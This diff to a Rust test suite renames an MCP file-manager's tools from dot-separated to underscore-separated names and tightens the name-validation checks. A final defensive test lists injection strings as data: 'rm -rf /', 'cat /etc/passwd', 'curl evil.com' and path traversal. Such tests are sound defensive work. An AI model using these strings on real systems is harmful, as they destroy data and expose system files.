@@ -23,21 +23,22 @@ use super::tools::get_all_tools;
 #[test]
 fn test_all_tool_names_are_valid_identifiers() {
     // Tool names must be valid identifiers (no injection vectors)
+    // MCP requires: ^[a-zA-Z0-9_-]{1,128}$
     let tools = get_all_tools();
     for tool in tools {
         assert!(
             tool.name
                 .chars()
-                .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '_'),
+                .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-'),
             "Tool name contains invalid characters: {}",
             tool.name
         );
         assert!(
-            !tool.name.contains(".."),
-            "Tool name contains path traversal: {}",
+            !tool.name.contains("__"),
+            "Tool name contains double underscore: {}",
             tool.name
         );
-        assert!(tool.name.len() <= 64, "Tool name too long: {}", tool.name);
+        assert!(tool.name.len() <= 128, "Tool name too long: {}", tool.name);
     }
 }
 
@@ -127,9 +128,9 @@ fn test_no_duplicate_tool_names() {
 #[test]
 fn test_app_tools_exist() {
     let tools = get_all_tools();
-    let app_tools: Vec<_> = tools.iter().filter(|t| t.name.starts_with("app.")).collect();
+    let app_tools: Vec<_> = tools.iter().filter(|t| t.name.starts_with("app_")).collect();
 
-    let expected = ["app.quit", "app.hide", "app.about"];
+    let expected = ["app_quit", "app_hide", "app_about"];
     for name in expected {
         assert!(app_tools.iter().any(|t| t.name == name), "Missing app tool: {}", name);
     }
@@ -138,21 +139,21 @@ fn test_app_tools_exist() {
 #[test]
 fn test_nav_tools_exist() {
     let tools = get_all_tools();
-    let nav_tools: Vec<_> = tools.iter().filter(|t| t.name.starts_with("nav.")).collect();
+    let nav_tools: Vec<_> = tools.iter().filter(|t| t.name.starts_with("nav_")).collect();
 
     let expected = [
-        "nav.open",
-        "nav.parent",
-        "nav.back",
-        "nav.forward",
-        "nav.up",
-        "nav.down",
-        "nav.home",
-        "nav.end",
-        "nav.pageUp",
-        "nav.pageDown",
-        "nav.left",
-        "nav.right",
+        "nav_open",
+        "nav_parent",
+        "nav_back",
+        "nav_forward",
+        "nav_up",
+        "nav_down",
+        "nav_home",
+        "nav_end",
+        "nav_pageUp",
+        "nav_pageDown",
+        "nav_left",
+        "nav_right",
     ];
     for name in expected {
         assert!(nav_tools.iter().any(|t| t.name == name), "Missing nav tool: {}", name);
@@ -163,17 +164,17 @@ fn test_nav_tools_exist() {
 #[test]
 fn test_sort_tools_exist() {
     let tools = get_all_tools();
-    let sort_tools: Vec<_> = tools.iter().filter(|t| t.name.starts_with("sort.")).collect();
+    let sort_tools: Vec<_> = tools.iter().filter(|t| t.name.starts_with("sort_")).collect();
 
     let expected = [
-        "sort.byName",
-        "sort.byExtension",
-        "sort.bySize",
-        "sort.byModified",
-        "sort.byCreated",
-        "sort.ascending",
-        "sort.descending",
-        "sort.toggleOrder",
+        "sort_byName",
+        "sort_byExtension",
+        "sort_bySize",
+        "sort_byModified",
+        "sort_byCreated",
+        "sort_ascending",
+        "sort_descending",
+        "sort_toggleOrder",
     ];
     for name in expected {
         assert!(sort_tools.iter().any(|t| t.name == name), "Missing sort tool: {}", name);
@@ -184,15 +185,15 @@ fn test_sort_tools_exist() {
 #[test]
 fn test_context_tools_exist() {
     let tools = get_all_tools();
-    let context_tools: Vec<_> = tools.iter().filter(|t| t.name.starts_with("context.")).collect();
+    let context_tools: Vec<_> = tools.iter().filter(|t| t.name.starts_with("context_")).collect();
 
     let expected = [
-        "context.getFocusedPane",
-        "context.getLeftPanePath",
-        "context.getRightPanePath",
-        "context.getLeftPaneContent",
-        "context.getRightPaneContent",
-        "context.getSelectedFileInfo",
+        "context_getFocusedPane",
+        "context_getLeftPanePath",
+        "context_getRightPanePath",
+        "context_getLeftPaneContent",
+        "context_getRightPaneContent",
+        "context_getSelectedFileInfo",
     ];
     for name in expected {
         assert!(
@@ -208,7 +209,7 @@ fn test_context_tools_exist() {
 fn test_volume_tools_require_index_param() {
     let tools = get_all_tools();
 
-    for name in ["volume.selectLeft", "volume.selectRight"] {
+    for name in ["volume_selectLeft", "volume_selectRight"] {
         let tool = tools.iter().find(|t| t.name == name).expect(name);
         let required = tool.input_schema.get("required").and_then(|r| r.as_array());
         assert!(
@@ -222,9 +223,9 @@ fn test_volume_tools_require_index_param() {
 #[test]
 fn test_volume_tools_exist() {
     let tools = get_all_tools();
-    let volume_tools: Vec<_> = tools.iter().filter(|t| t.name.starts_with("volume.")).collect();
+    let volume_tools: Vec<_> = tools.iter().filter(|t| t.name.starts_with("volume_")).collect();
 
-    let expected = ["volume.list", "volume.selectLeft", "volume.selectRight"];
+    let expected = ["volume_list", "volume_selectLeft", "volume_selectRight"];
     for name in expected {
         assert!(
             volume_tools.iter().any(|t| t.name == name),
@@ -238,7 +239,7 @@ fn test_volume_tools_exist() {
 #[test]
 fn test_volume_list_has_no_required_params() {
     let tools = get_all_tools();
-    let tool = tools.iter().find(|t| t.name == "volume.list").expect("volume.list");
+    let tool = tools.iter().find(|t| t.name == "volume_list").expect("volume_list");
 
     let required = tool
         .input_schema
@@ -254,7 +255,7 @@ fn test_volume_list_has_no_required_params() {
 fn test_volume_select_index_schema() {
     let tools = get_all_tools();
 
-    for name in ["volume.selectLeft", "volume.selectRight"] {
+    for name in ["volume_selectLeft", "volume_selectRight"] {
         let tool = tools.iter().find(|t| t.name == name).expect(name);
 
         // Check that index property exists and is of type integer
@@ -588,12 +589,12 @@ fn test_file_entry_optional_fields_omitted() {
 fn test_tool_names_are_case_sensitive() {
     let tools = get_all_tools();
 
-    // Should find nav.up
-    assert!(tools.iter().any(|t| t.name == "nav.up"));
+    // Should find nav_up
+    assert!(tools.iter().any(|t| t.name == "nav_up"));
 
-    // Should NOT find NAV.UP or Nav.Up
-    assert!(!tools.iter().any(|t| t.name == "NAV.UP"));
-    assert!(!tools.iter().any(|t| t.name == "Nav.Up"));
+    // Should NOT find NAV_UP or Nav_Up
+    assert!(!tools.iter().any(|t| t.name == "NAV_UP"));
+    assert!(!tools.iter().any(|t| t.name == "Nav_Up"));
 }
 
 #[test]
@@ -736,12 +737,12 @@ fn test_pane_state_store_thread_safety() {
 fn test_malicious_tool_name_injection() {
     // These are tool names that an attacker might try
     let malicious_names = [
-        "nav.up; rm -rf /",
-        "nav.up && cat /etc/passwd",
-        "nav.up | curl evil.com",
+        "nav_up; rm -rf /",
+        "nav_up && cat /etc/passwd",
+        "nav_up | curl evil.com",
         "../../../etc/passwd",
-        "nav.up\nrm -rf /",
-        "nav.up\x00hidden",
+        "nav_up\nrm -rf /",
+        "nav_up\x00hidden",
     ];
 
     let tools = get_all_tools();
